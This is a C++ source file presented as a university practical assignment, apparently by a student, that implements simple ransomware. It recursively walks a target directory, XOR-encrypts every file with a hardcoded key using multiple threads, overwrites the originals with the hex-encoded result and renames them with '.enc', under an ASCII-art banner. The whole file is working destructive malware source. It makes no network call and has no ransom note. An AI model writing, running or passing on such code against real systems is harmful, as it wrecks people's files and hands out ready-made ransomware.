/* Título: Práctica 4 - Ransomware
   Nombre archivo: ransom.cpp
   Autor: Manuel Cabrera Liñán */

#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <dirent.h>
#include <sys/stat.h>
#include <fstream>
#include <iomanip>
#include <thread>

//Función que cifra un bloque con el algoritmo de cifrado XOR
void encrypt_block(std::vector<uint8_t>& buffer, int start, int end, std::string key) {
    for (int i = start; i < end && i < buffer.size(); i++) {
        buffer[i] ^= key[i % key.length()];
    }
}

//Función que escribe el buffer cifrado en el archivo en formato hexadecimal
void write_hex(std::ofstream& outfile, const std::vector<uint8_t>& buffer) {
    for (auto byte : buffer) {
        outfile << std::hex << std::setfill('0') << std::setw(2) << (int)(byte);
    }
}

//Función que con multihilo, se encarga de dividir el fichero en bloques que cada
//hilo se va a encargar de ejecutar la función de cifrado de manera paralela
void encrypt_file(const std::string& filename, std::string key) {
	
	//Fichero del que se van a leer los bytes
    std::ifstream infile(filename, std::ifstream::binary);
    if (!infile) {
        std::cerr << "Error al abrir el archivo para lectura." << std::endl;
        return;
    }

    std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(infile)), std::istreambuf_iterator<char>());
    infile.close();

    int num_threads = std::thread::hardware_concurrency(); //En mi portátil son 8
    std::vector<std::thread> threads;
    int block_size = buffer.size() / num_threads;

    for (int i = 0; i < num_threads; i++) {
        int start = i * block_size;
        int end = (i == num_threads - 1) ? buffer.size() : (i + 1) * block_size;
        threads.emplace_back(encrypt_block, std::ref(buffer), start, end, std::ref(key));
    }

    for (auto& th : threads) {
        th.join();
    }
	
	//Fichero al que se van a sobreescribir los bytes
	std::ofstream outfile(filename, std::ofstream::binary | std::ofstream::trunc);
    if (!outfile) {
        std::cerr << "Error al abrir el archivo para escritura." << std::endl;
        return;
    }
	
	write_hex(outfile, buffer);
    outfile.close();

    //Fichero al que se va a cambiar el nombre del archivo original para reflejar que está cifrado
    std::string new_filename = filename + ".enc";
    if (std::rename(filename.c_str(), new_filename.c_str()) != 0) {
        std::cerr << "Error al cambiar el nombre del archivo." << std::endl;
        return;
    }
	
	std::cout << new_filename << std::endl;
}

//Función que se encarga de navegar entre los directorios y subdirectorios de
//manera recursiva para poder listar los ficheros que se van a cifrar
void encrypt_directory_files(const std::string& directory_path, std::string key) {
    DIR* dir;
    struct dirent* entry;
    struct stat entry_stat;
	std::vector<std::string> files;
    if (!(dir = opendir(directory_path.c_str()))) {
        std::cerr << "Error opening directory: " << directory_path << std::endl;
        return;
    }

    while ((entry = readdir(dir)) != nullptr) {
        // Ignora las entradas "." y ".." que son referencias al directorio actual y al padre
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        std::string entry_path = directory_path + "/" + entry->d_name;
		
		if (stat(entry_path.c_str(), &entry_stat) != -1){
			if(S_ISDIR(entry_stat.st_mode))
				encrypt_directory_files(entry_path, key);
			else
				encrypt_file(entry_path, key);
		}
		else{
			std::cerr << "Error getting the status of the file: " << entry_path << std::endl;
            continue;
		}

		stat(entry_path.c_str(), &entry_stat);
        if (S_ISREG(entry_stat.st_mode)) {
            files.push_back(entry->d_name);  // Es un archivo
        }
    }
	
	//Se imprimen los resultados
    std::cout << "Files " << directory_path << ":" << std::endl;

    closedir(dir);
}

//Función main del ransomware
int main(int argc, char** argv) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <directory_path>" << std::endl;
        return 1;
    }
	
	std::cout<< "░░█ █░█ ▄▀█ █▄░█ █▀▀ ▄▀█ █▄░█ █▀ █▀█ █▀▄▀█ █░█░█ ▄▀█ █▀█ █▀▀"<<std::endl<<
				"█▄█ █▄█ █▀█ █░▀█ █▄█ █▀█ █░▀█ ▄█ █▄█ █░▀░█ ▀▄▀▄▀ █▀█ █▀▄ ██▄"<<std::endl<<std::endl;

    std::string directory_path = argv[1];
	
	std::string key = "juanga";

    encrypt_directory_files(directory_path, key);

    return 0;
}